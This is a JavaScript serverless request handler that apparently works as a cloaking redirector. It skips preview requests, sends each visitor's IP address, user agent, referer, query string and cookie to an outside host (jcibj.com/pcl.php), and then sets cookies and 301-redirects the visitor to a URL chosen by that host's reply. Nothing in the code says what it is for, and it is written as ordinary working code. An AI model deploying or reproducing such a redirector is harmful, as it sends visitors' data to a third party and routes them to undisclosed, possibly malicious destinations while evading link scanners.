export default async function handler(req, res) {
  if (req.headers['x-purpose'] === 'preview') {
    return res.status(204).end(); // Do nothing if preview
  }

  const now = new Date().toISOString();
  const id = '499178';
  const uid = 'yrez8stiipeall2mn4qv94nec';
  const query = req.url.split('?')[1] || '';
  const externalUrl = 'https://jcibj.com/pcl.php';

  const data = {
    date: now,
    lan: req.headers['accept-language'] || '',
    ref: req.headers['referer'] || '',
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    ipr: req.headers['x-forwarded-for'] || '',
    sn: req.headers.host || '',
    requestUri: req.url,
    query,
    ua: req.headers['user-agent'] || '',
    co: req.cookies?._event || '',
    user_id: uid,
    id,
  };

  // POST request to external server
  let response;
  try {
    const fetchRes = await fetch(externalUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams(data).toString(),
    });

    response = await fetchRes.text();
  } catch (e) {
    return res.status(500).send('External request failed');
  }

  const arr = response.split(',');
  let redirectUrl = arr[1] || '';
  let cookieName = arr[7];
  let cookieVal = arr[8];
  let cookieDays = parseInt(arr[9]) || 1;
  let setCookieEvent = arr[6];
  let setEventFlag = parseInt(arr[4]);
  let cookieDuration = 60 * 60 * 24 * cookieDays;

  let finalQuery = '';
  if (query) {
    finalQuery = redirectUrl.includes('?') ? `&${query}` : `?${query}`;
  }

  // Set cookies
  if (arr[0] === 'true') {
    if (cookieName) {
      res.setHeader('Set-Cookie', `${cookieName}=${cookieVal}; Path=/; Max-Age=${cookieDuration}`);
    }
    if (arr[2] && (setEventFlag === 1 || setEventFlag === 3)) {
      res.setHeader('Set-Cookie', `_event=${setCookieEvent}; Path=/; Max-Age=${cookieDuration}`);
    }
    return res.redirect(301, redirectUrl + finalQuery);
  } else if (arr[0] === 'false') {
    if (arr[2] && (setEventFlag === 2 || setEventFlag === 3)) {
      res.setHeader('Set-Cookie', `_event=${setCookieEvent}b; Path=/; Max-Age=${cookieDuration}`);
    }
    const redirectFinal = arr[5] ? finalQuery : '';
    return res.redirect(301, redirectUrl + redirectFinal);
  } else {
    if (arr[2] && (setEventFlag === 2 || setEventFlag === 3)) {
      res.setHeader('Set-Cookie', `_event=${setCookieEvent}b; Path=/; Max-Age=${cookieDuration}`);
    }
    return res.status(204).end(); // No redirection
  }
}
